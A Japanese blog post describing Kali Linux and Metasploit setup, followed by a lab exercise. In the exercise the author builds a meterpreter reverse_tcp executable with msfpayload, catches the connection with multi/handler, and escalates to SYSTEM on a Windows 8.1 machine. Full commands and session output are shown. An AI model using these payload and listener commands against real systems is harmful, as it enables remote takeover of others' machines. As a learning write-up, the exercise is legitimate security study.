---
layout: post
title: "Install&Play Metasploit on Kali Linux"
date: 2014-08-09 14:39:47.000 +09:00
categories:
- Linux
- Security
tags:
- kali
- metasploit
---

セキュリティ関連の勉強中、ということで、metasploit というフレームワークに手を出してみることに。Kali Linux とかいう Penetration Test に特化したディストリビューションがあるらしいので、それを使ってみる。Kali Linux には Metasploit が標準で含まれているようです。

 
Penetration Testing Software | Metasploit <br />
[http://www.metasploit.com/](http://www.metasploit.com/)

 
Kali Linux | Rebirth of BackTrack, the Penetration Testing Distribution. <br />
[http://www.kali.org/](http://www.kali.org/)

 
2014/8/7 時点での最新版は、Kali Linux 64bit 1.0.8 ([http://www.kali.org/downloads/](http://www.kali.org/downloads/))

 
ISO をダウンロードして普通にインストールするだけです。今回は Hyper-V ゲストにインストール。インストーラーでは迷わず Graphical Install をチョイス。なお、RAM は 1GB だとちょっと辛いので、最低でも 2GB は割り当てたほうがよいです。

 
<font color="#0000ff">(2015/1/26 追記)      <br>本家のサイトを見ると、10GB HDD、512MB RAM が最低らしいです。</font>

 
Kali Linux Hard Disk Install | Kali Linux Official Documentation <br />
[http://docs.kali.org/installation/kali-linux-hard-disk-install](http://docs.kali.org/installation/kali-linux-hard-disk-install)

 
![]({{site.assets_url}}2014-08-09-image.png)

 
インストールは問題なく終わり、ログイン画面。

 
![]({{site.assets_url}}2014-08-09-image1.png)

 
面白いことに、世間の流れとは逆に、Kali Linux は root で操作することが標準となっているようです。理由は↓

 
Why Does Kali Linux Only Install as root ? – Kali Linux Official Documentation <br />
[http://docs.kali.org/faq/why-does-kali-linux-only-install-as-root](http://docs.kali.org/faq/why-does-kali-linux-only-install-as-root)

 
何はともあれ、まずは ssh を起動します。openssh-server はインストールに含まれているようですが、自動起動するように設定されていないので、自動機能の設定もしておきます。

 
```
root@kali:~# service ssh start 
[ ok ] Starting OpenBSD Secure Shell server: sshd.

root@kali:~# sudo update-rc.d ssh enable 
update-rc.d: using dependency based boot sequencing
```
 
![]({{site.assets_url}}2014-08-09-image2.png)

 
root のままだと何だか気持ち悪いので、作業用ユーザー alice を作ることにします。

 
```
root@kali:~# useradd -m alice 
root@kali:~# passwd alice 
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully 
root@kali:~# usermod -a -G sudo alice 
root@kali:~# chsh -s /bin/bash alice
```
 
~~環境変数がいけてないので、.bash_profile を作って追加します。~~

 
```
alice@kali:~$ echo $PATH 
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games 
alice@kali:~$ pwd 
/home/alice 
alice@kali:~$ ls -la 
total 24 
drwxr-xr-x 2 alice alice 4096 Aug  8 21:42 . 
drwxr-xr-x 3 root  root  4096 Aug  8 21:42 .. 
-rw-r--r-- 1 alice alice  220 Dec 29  2012 .bash_logout 
-rw-r--r-- 1 alice alice 3391 Jul 21 15:02 .bashrc 
-rw-r--r-- 1 alice alice 3392 Dec 29  2012 .bashrc.original 
-rw-r--r-- 1 alice alice  675 Dec 29  2012 .profile 
alice@kali:~$ echo export PATH=/usr/sbin:/usr/bin:/sbin:/bin:${PATH} > .bash_profile
```
 
<font color="#0000ff">(2015/1/26 追記)      <br>上記方法だと、GUI からターミナルを起動したときに設定が反映されません。というのも、/etc/profile の中で root と root 以外のユーザーで異なる PATH を設定するように記述されているためです。</font>

 
```
if [ "`id -u`" -eq 0 ]; then 
  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" 
else 
  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games" 
fi 
export PATH
```
 
<font color="#0000ff">環境変数をユーザーによって分けておく理由はないので、以下のように if 文は消しておきます。これで GUI 上のターミナルでも環境変数が正しく設定されます。</font>

 
```
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" 
export PATH
```
 
これで OS の準備は終了です。Metasploit を使い始める前に、msfupdate コマンドを実行してバイナリを更新しておきます。バージョンは 4.9.3-2014072301-1kali0 になったようです。

 
```
alice@kali:~$ sudo msfupdate

We trust you have received the usual lecture from the local System 
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others. 
    #2) Think before you type. 
    #3) With great power comes great responsibility.

[sudo] password for alice: 
[*] 
[*] Attempting to update the Metasploit Framework... 
[*]

[*] Checking for updates via the APT repository 
[*] Note: expect weekly(ish) updates using this method 
[*] Updating to version 4.9.3-2014072301-1kali0 
Reading package lists... Done 
Building dependency tree 
Reading state information... Done 
The following packages will be upgraded: 
  metasploit metasploit-framework 
2 upgraded, 0 newly installed, 0 to remove and 52 not upgraded. 
Need to get 259 MB of archives. 
After this operation, 16.3 MB of additional disk space will be used. 
Get:1 http://http.kali.org/kali/ kali/main metasploit-framework amd64 4.9.3-2014072301-1kali0 [69.8 MB] 
Get:2 http://http.kali.org/kali/ kali/non-free metasploit amd64 4.9.3-2014072301-1kali0 [189 MB] 
Fetched 259 MB in 1min 19s (3,257 kB/s) 
Reading changelogs... Done 
(Reading database ... 332471 files and directories currently installed.) 
Preparing to replace metasploit-framework 4.9.3-2014071601-1kali2 (using .../metasploit-framework_4.9.3-2014072301-1kali0_amd64.deb) ... 
Unpacking replacement metasploit-framework ... 
Preparing to replace metasploit 4.9.3-2014071601-1kali2 (using .../metasploit_4.9.3-2014072301-1kali0_amd64.deb) ... 
[ ok ] Stopping Metasploit worker: worker. 
[ ok ] Stopping Metasploit web server: thin. 
[ ok ] Stopping Metasploit rpc server: prosvc. 
Leaving 'diversion of /usr/bin/msfbinscan to /usr/bin/msfbinscan.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfcli to /usr/bin/msfcli.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfconsole to /usr/bin/msfconsole.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfd to /usr/bin/msfd.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfelfscan to /usr/bin/msfelfscan.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfencode to /usr/bin/msfencode.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfmachscan to /usr/bin/msfmachscan.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfpayload to /usr/bin/msfpayload.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfpescan to /usr/bin/msfpescan.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfrop to /usr/bin/msfrop.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfrpc to /usr/bin/msfrpc.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfrpcd to /usr/bin/msfrpcd.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfupdate to /usr/bin/msfupdate.framework by metasploit' 
Leaving 'diversion of /usr/bin/msfvenom to /usr/bin/msfvenom.framework by metasploit' 
Unpacking replacement metasploit ... 
Setting up metasploit-framework (4.9.3-2014072301-1kali0) ... 
Setting up metasploit (4.9.3-2014072301-1kali0) ... 
skipping metasploit initialization: postgres not running 
insserv: warning: current start runlevel(s) (empty) of script `metasploit' overrides LSB defaults (2 3 4 5). 
insserv: warning: current stop runlevel(s) (0 1 2 3 4 5 6) of script `metasploit' overrides LSB defaults (0 1 6). 
[ ok ] Starting PostgreSQL 9.1 database server: main. 
Configuring Metasploit... 
Creating metasploit database user 'msf3'... 
Creating metasploit database 'msf3'... 
insserv: warning: current start runlevel(s) (empty) of script `metasploit' overrides LSB defaults (2 3 4 5). 
insserv: warning: current stop runlevel(s) (0 1 2 3 4 5 6) of script `metasploit' overrides LSB defaults (0 1 6). 
[ ok ] Starting Metasploit rpc server: prosvc. 
[ ok ] Starting Metasploit web server: thin. 
[ ok ] Starting Metasploit worker: worker. 
alice@kali:~$
```
 
以下の情報によると、Metasploit の起動には postgresql と metasploit サービスの起動が必要みたいなので、これらも自動起動にしておきます。

 
```
alice@kali:~$ sudo update-rc.d postgresql enable 
update-rc.d: using dependency based boot sequencing 
alice@kali:~$ sudo update-rc.d metasploit enable 
update-rc.d: using dependency based boot sequencing
```
 
Starting Metasploit Framework | Kali Linux Official Documentation <br />
[http://docs.kali.org/general-use/starting-metasploit-framework-in-kali](http://docs.kali.org/general-use/starting-metasploit-framework-in-kali)

 
実際に使う前に、ユーザーとライセンスの登録を行います。ローカル コンソール上でブラウザーを起動して、[https://localhost:3790](https://localhost:3790/) を開きます。こんな感じの画面が出るので、ユーザー名、パスワードなどを決めます。これはローカルで使うものです。

 
![]({{site.assets_url}}2014-08-09-image3.png)

 
次にライセンス登録を行って製品キーを取得します。

 
![]({{site.assets_url}}2014-08-09-image4.png)

 
登録されました。

 
![]({{site.assets_url}}2014-08-09-image5.png)

 
再起動しろ、と言われているので再起動します。

 
```
alice@kali:~$ sudo service metasploit restart 
[ ok ] Stopping Metasploit worker: worker. 
[ ok ] Stopping Metasploit web server: thin. 
[ ok ] Stopping Metasploit rpc server: prosvc. 
[ ok ] Starting Metasploit rpc server: prosvc. 
[ ok ] Starting Metasploit web server: thin. 
[ ok ] Starting Metasploit worker: worker.
```
 
msfconsole コマンドでコンソールが起動します。

 
![]({{site.assets_url}}2014-08-09-image6.png)

 
このまま終わるのもつまらないので、何かやってみましょう。教材はこちら↓

 
Create Simple Exploit Using Metasploit to Hack Windows 7 <br />
[http://www.hacking-tutorial.com/hacking-tutorial/create-simple-exploit-using-metasploit-to-hack-windows-7/#sthash.makjzAdL.TEQBARvt.dpbs](http://www.hacking-tutorial.com/hacking-tutorial/create-simple-exploit-using-metasploit-to-hack-windows-7/#sthash.makjzAdL.TEQBARvt.dpbs)

 
同じコマンドを実行するだけです。まずは・・・

 
```
alice@kali:~$ sudo msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.80 X > Documents/v4L.exe 
Created by msfpayload (http://www.metasploit.com). 
Payload: windows/meterpreter/reverse_tcp 
Length: 287 
Options: {"LHOST"=>"10.10.10.80"}
```
 
v4L.exe とかいう怪しい実行可能ファイルができました。次に、Kali Linux では被攻撃システムからのアクセスを待機しておきます。

 
```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp 
payload => windows/meterpreter/reverse_tcp 
msf exploit(handler) > set lhost 10.10.10.80 
lhost => 10.10.10.80 
msf exploit(handler) > exploit -j -z 
[*] Exploit running as background job.

[*] Started reverse handler on 10.10.10.80:4444 
[*] Starting the payload handler... 
msf exploit(handler) >
```
 
先ほど作った怪しげな v4L.exe を適当な Windows マシンにコピーして実行します。バージョンは Windows 8.1 + Update 1 です。

 
![]({{site.assets_url}}2014-08-09-image7.png)

 
v4L.exe を実行すると、Kali Linux 側に信号が来るので、あとは前述したサイトに書かれているコマンドを実行するだけです。

 
```
msf exploit(handler) > exploit -j -z 
[*] Exploit running as background job.

[*] Started reverse handler on 10.10.10.80:4444 
[*] Starting the payload handler... 
msf exploit(handler) > [*] Sending stage (769536 bytes) to 10.10.20.70 
[*] Meterpreter session 1 opened (10.10.10.80:4444 -> 10.10.20.70:49596) at 2014-08-08 22:23:35 -0700 
[deprecated] I18n.enforce_available_locales will default to true in the future. If you really want to skip validation of your locale you can set I18n.enforce_available_locales = false to avoid this message. 
sessions -l

Active sessions 
===============

  Id  Type                   Information                     Connection 
  --  ----                   -----------                     ---------- 
  1   meterpreter x86/win32  CONTOSO\Administrator @ CLIENT  10.10.10.80:4444 -> 10.10.20.70:49596 (10.10.20.70)

msf exploit(handler) > sessions -i 1 
[*] Starting interaction with 1...

meterpreter > getsystem 
...got system (via technique 1). 
meterpreter > shell 
Process 2924 created. 
Channel 1 created. 
Microsoft Windows [Version 6.3.9600] 
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami -priv 
whoami -priv

PRIVILEGES INFORMATION 
----------------------

Privilege Name                  Description                               State 
=============================== ========================================= ======= 
SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
SeTcbPrivilege                  Act as part of the operating system       Enabled 
SeSystemProfilePrivilege        Profile system performance                Enabled 
SeProfileSingleProcessPrivilege Profile single process                    Enabled 
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
SeDebugPrivilege                Debug programs                            Enabled 
SeAuditPrivilege                Generate security audits                  Enabled 
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled 
SeTimeZonePrivilege             Change the time zone                      Enabled 
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled

C:\Windows\system32>whoami 
whoami 
nt authority\system

C:\Windows\system32>
```
 
無事、Windows マシンを乗っ取ることができたようです。恐ろしいことに、Administrator どころか System アカウントで動いています。しかも Kali Linux 側ではパスワードなどの入力は一切行っていません。

 
このコンソール上でウィンドウを持つアプリケーションを実行すると、v4L.exe を実行したコンソール上にウィンドウが表示されます。それを Process Explorer で見るとこんな感じになります。まだ何も調べていませんが、一体どういう仕組みなんでしょうかね。

 
![]({{site.assets_url}}2014-08-09-image8.png)

 
ただし、Windows もやられっぱなしというわけではありません。Windows Defender の real-time protection が有効になっていれば、v4L.exe はすぐに Trojan:Win32/Swrort.A として検出され、削除されます。 まさにトロイの木馬のうち、バックドア型のウィルスですね。

 
![]({{site.assets_url}}2014-08-09-image9.png)

